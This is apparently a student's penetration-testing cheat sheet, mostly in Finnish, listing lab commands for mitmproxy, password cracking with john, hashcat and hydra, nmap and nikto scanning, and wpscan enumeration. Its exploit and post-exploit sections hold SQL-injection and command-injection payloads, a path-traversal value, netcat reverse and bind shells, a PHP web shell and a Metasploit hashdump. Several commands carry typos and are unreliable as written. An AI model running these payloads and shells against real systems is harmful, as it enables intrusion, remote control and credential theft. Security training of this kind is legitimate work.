# PenTest Cheat Sheet 

## Alkutoimet

    apt-get update&&apt-get upgrade

    service postgresql start

    msfconsole

    msfdb init

## mitmproxy

tehty Python3

    sudo apt-get install virtualenv python3-pip

    mkdir mimt

    virtualenv env -p python3

Käynnistys (env)

    source env/bin/activate

Asenna MITMPROXY

    pip install mitmproxy

Käynnistys

    mimtproxy -p 8888

Komentoja

Valitse oikea sanoma listasta
- voi merkitä m komennolla

e = edit

shift -f = follow

e 2 = edit form
- muuta parametreja

tab ja q

r lähettää

```
$ sudo apt-get -y install virtualenv python3-pip
$ virtualenv env –python=python3
$ source env/bin/activate
$ cat requirements.txt
mitmproxy
$ pip install -r requirements.txt
```
Run MitmProxy
```
$ export EDITOR=nano # if you mistakenly open vim, to exit: ESC :q!
$ mitmproxy -p 8888

```

### interception

request / response pysäytys
- muokkaus ja eteenpäin
- i -> pattern
- a

## foxyproxy

Firefox Addons: FoxyProxy Standard

– Add
– Proxy Type: HTTP # Did not work with socks5
– Title or Description: mitmproxy 8001 # only first letters show in Firefox toolbar
– IP address, DNS name… : localhost
– Port: 8001 # mitmproxy listen port, given with ‘mimproxy -p 8001’

Patterns
– New White: Pattern: ‘localhost:*’
– Remove all other patters. Remove “All URLs” pattern. Remove all Black Patterns.

Test
– google.com should open without warnings. Foxyproxy icon shows (in Firefox toolbar) shows direct connection (no proxy).
– WebGoat (localhost:8080) browsing should make Foxyproxy icon show “mitm” proxy. All requests to localhost webgoat should show in mitmproxy TUI.
Useful commands

```
e # edit flow, 2 form. Enter to edit field value, tab to accept
q # quit to previous screen
f ~m post # filter POST requests
f ~b Congra # search body, case sensitive
f \.js # URLs containing ‘.js’ (TUI does not show backslash after typing the rest of the filter)
f ~t json # match content type
F # follow (autoscroll)
K # keybindings (different from ? help)
? # help
m # mark flow (HTTP request) toggle
M # show marked only/all toggle
w # write flows to file. Load with ‘mitmproxy -r goat1.mitmproxy –no-server’
shift # select text for copy-paste
i accountID= # intercept flow (stop http request, wait until you allow it)
a # allow intercepted flow (A allow all)
```

## Salasanalistat ja salasanet

One of the better basic wordlists in Kali is /usr/share/wordlists/rockyou.txt.gz. To unzip simply run gzip -d /usr/share/wordlists/rockyou.txt.gz. 

Tee oma
```
ftp://ftp.openwall.com/pub/wordlists/
http://www.openwall.com/mirrors/
http://gdataonline.com/downloads/GDict/
http://www.outpost9.com/files/WordLists.html
http://www.vulnerabilityassessment.co.uk/passwords.htm
http://packetstormsecurity.org/Crackers/wordlists/
http://www.ai.uga.edu/ftplib/natural-language/moby/
http://www.cotse.com/tools/wordlists1.htm
http://www.cotse.com/tools/wordlists2.htm
http://wordlist.sourceforge.net/
```

### john

JtR ajetaan komennolla, joka käyttää oletussanlistaa (/usr/share/john/password.lst) ja jatkaa brute force tämän jälkeen.

    john tiedosto_jossa_salasanat

Jos käytössä on sanalista, otetaan se käyttöön

   john --wordlist=sanalista.lst tiedosto_jossa_salasanat

Murretut salasanat tulsotetaan ruudulle, ja tallennetaan tiedostoon 

    $JOHN/john.pot

$JOHN viittaa hakemistoon ohjelman kotihakemistoon. Murretut salasanat saa näkyviin myöhemmin komennolla

    john --show tiedosto_jossa_salasanat


Esimerkki

```
msf (exploit/unix/ftp/vsftpd_234_backdoor): use post/linux/gather/hashdump
msf (exploit/unix/ftp/vsftpd_234_backdoor): set SESSION 1
msf (exploit/unix/ftp/vsftpd_234_backdoor): exploit
```

Tiedosto tallennettiin lokaatioon /root/.msf4/loot/20190411113555_default_10.0.2.4_linux.hashes_978462.txt

Yritetään murtaa salasanat komennolla

    john /root/.msf4/loot/20190411113555_default_10.0.2.4_linux.hashes_978462.txt


### hashcat

Dictionary attack

    hashcat hashess.txt wordlist.txt -o murretut

Kombinaatio hyökkäys

    hashcat -m 0 hashess.txt wordlist.txt -o murretut -a 1

s for status
- välitulosteet

### hydra

Hydraa voi käyttää palvelua kuin palvelua vastaan
- ssh
- Routers
- Kaikki mikä pyytää salasanaa

Sanalista ensin
- -l yksi tunnus
- -L lista tunnuksia

    hydra [IP] -L [usernames] -P [passwords] [service]

Kohde
- IP
- -P password list
- -p yksi salasana
- Service määrittely helpistä
  - http-get|post-form
- Proxyn avulla muuttujien nimet
- F tarkoittaa mitä jos failed login: teksti sivulta
- s tarkoittaa onnistunut loginia

Toimivampi
- hydra http form

    hydra 172.28.128.3 -l admin -P /testi/rockyou.txt http-post-form "/mutillidae/?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"

SSH

    hydra -l msfadmin -P top.txt 172.28.128.3 -t 4 -I ssh

## Eyewitness / httrack

Spidering, web sivun tiedustelu

    sudo apt-get install eyewitness

    eyewitness -f /root/tiedosto_jossa_ip_osoitteet --web --prepend-https

### javascript hyökkäys selaimeen (myös hackthebox)

1. Mene sivulle
2. Tee jotain
3. Avaa F12 console
4. Mitä JS kutsutaan: networks
5. avaa lähdekoodi hiiten oikealla
6. deobfuscoi koodi
7. mitä metodeita siinä on
8. käytä metodia
9. ylikirjoita funktio jos tarpeen
10. avaa dekoodaukset
11. curl -X post URL


## Skannaus

### Porttiskannaus

1. Banner Grabbing

    db_nmap -vvv -n -sV 10.10.10.1-254

2. Kohdekone tarkemmin

    db_nmap -vvv -Pn -n -A -p 1-65535 10.10.10.120 -oA all-10.10.10.120

Kesto 15:42-15:56 -> 14 minuuttia

3.  nmap 10.10.10.117 -v -Pn -A -p 1-65535 -T4 |tee nmap.txt


#### Ping scan

1. Ping scan
- Ei skannata portteja

    nmap -vvv -n -sn IP-254

#### http scan

HTTP portit
- Ei udp-skannausta: -sS

    nmap IP-254 -vvv -sS -n -p 80,443 -oA tiedosto

### Kokeillaan dirbuster skannaus

Target: http://10.10.10.120:80

Valitaan sanalistaksi Kalin valmis samanlista dirbuster/directory-list-2.3-small.txt

### seuraavaksi skannataan WordPress

Perusskannaus
- tutki kaikki pluginit

    wpscan --url  http://10.10.10.120/wp/wordpress/ --enumerate p

Kokeillaan käyttäjien enumerointi

    wpscan --url  http://10.10.10.120/wp/wordpress/ --enumerate u

## haavoittuvuusskannaus

### Nikto

nikto -host 10.10.10.117 -port 80 -Display V -Format xml -output /home/user/nikto117.xml

Skannauksen voi ajaa komennoilla

    nikto -h IP -p 1-1000

    nikto -h IP -p 80,443 -o tiedosto_jonne_tulos

### nessus

ToDo

## Exploits

Domain nimet käyttöön
- /etc/hosts

Alidomainit 
- wfuzz

### sql injektio

    Smith' OR '1'='1'

    <option value="101 OR 1=1">Columbia</option>

    X'OR'1'='1

    101 or 1=1 order by employee_id desc

Kaava:

Ei näytä virheilmoituksia, jos laittaa vaikka '.

Jos ok syöte -> sivu ok
- Tosi syötteellä: 1' and 1=1
- Palauttaa arvon 1 mukaisen arvon, joten on haavoittuvainen

Jos haavoittuvuus -> sivu ei ok jollain tavalla
- 1' and 1=0
- saadaan invalid page

Kokeillaan vielä tosi
- 1' order by 1

Haetaan dataa
- UNION select 1,

#### Esimerkkejä

Examples of TRUE statements for discovering sqli
- aNd 1=1
- aNd 21=21
- orDeR bY 1

Comments to end the quries:
- anD 1=1//
- anD 1=1;//


#### Command injection

    <option>"; ls"</option>

### sqlmap

    sqlmap -u "Target URL, jossa parametrit"

### Path traversal

    <option label="CsrfPromptByPass.html" value="../../../../../WEB-INF/spring-security.xml">CsrfPromptByPass.html</option>

## Post-exploits

### Reverse shellit

python -c 'import pty;pty.spawn("/bin/bash")'

### hashdump


### Steghide

    steghide extract -sf kuva.jpg

### Netcat

    nc -vz IP portti

    nc -vv -l 8888 IP

    nc -e /bin/shell IP-kali 8888

Asetetaan kohdekneella Netcat kuuntelemaan porttia 1337

    nc -l -p 1337

Hyökkäyskoneella kytkeydytään porttiin

    nc 10.0.2.4 1337

Tiedostojen siirto: Komento annetaan kohdekoneella.

    nc -l -p 7777 > virux.exe

Kohdekoneelle saadaan ladattua tiedosto käyttämällä Netcattia hyökkääjän koneella. 

```
nc IP portti < virux.exe

```

### Remote connection Netcatin avulla

Lopuksi tehdään backdoor Netcatin avulla, eli asetetaan komentotulkki kuuntelemaan valittua porttia.

netcat sitoo ohjelman porttiin optiolla -e.

    nc -l -p 12345 -e /bin/sh

    nc IP portti # hyökkääjän koneella

### Tiivisteet

Aja Linuxilla
- echo sana | base64 | base64 -d

echo -n passu | sha251 | tee tiedosto

## Muuta 

hashcat hashes --force sankirja --show crashed

searchsploit
- --mirror

linenum
- koneen enumerointi
- cronit
- arat tiedostot

pspy
- mitä ajossa

wget

curl

    python2 -m simpleHTTPServer

    wget IP 8000 file

Komentojen ajo webin kautta

    <?php echo system ($_REQUEST['a']); ?>

    URL?a=ls

wfuzz
- alidomainien etsimiseen
- sana fuzz korvataan

gobuster

smbmap
- Samballe

cewl
- sanalista sivusta

dig
- url any

## Linkit

https://github.com/immonju1/pentest



